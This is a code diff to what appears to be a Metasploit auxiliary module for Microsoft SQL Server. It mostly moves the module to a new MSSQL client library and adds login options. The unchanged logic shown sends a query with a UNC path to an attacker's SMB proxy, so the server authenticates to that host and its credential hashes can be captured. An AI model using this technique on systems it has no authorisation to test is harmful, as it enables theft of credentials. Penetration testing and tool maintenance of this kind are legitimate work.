@@ -2,9 +2,10 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+require 'metasploit/framework/mssql/client'
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::MSSQL
+  include Metasploit::Framework::MSSQL::Client
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
@@ -34,7 +35,14 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('SMBPROXY', [ true, 'IP of SMB proxy or sniffer.', '0.0.0.0']),
+        Opt::RHOST,
+        Opt::RPORT(1433),
+        OptString.new('USERNAME', [ false, 'The username to authenticate as', 'sa']),
+        OptString.new('PASSWORD', [ false, 'The password for the specified username', '']),
+        OptBool.new('TDSENCRYPTION', [ true, 'Use TLS/SSL for TDS data "Force Encryption"', false]),
+        OptBool.new('USE_WINDOWS_AUTHENT', [ true, 'Use windows authentication (requires DOMAIN option set)', false]),
       ])
+    set_sane_defaults
   end
 
   def run_host(ip)
@@ -70,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Setup query
     sql = "#{sprocedure} '\\\\#{smbproxy}\\#{rand_filename}'"
-    result = mssql_query(sql, false) if mssql_login_datastore
+    result = mssql_query(sql, false) if mssql_login(datastore['USERNAME'], datastore['PASSWORD'])
     column_data = result[:rows]
     print_good("Successfully executed #{sprocedure} on #{rhost}")
     print_good("Go check your SMB relay or capture module for goodies!")
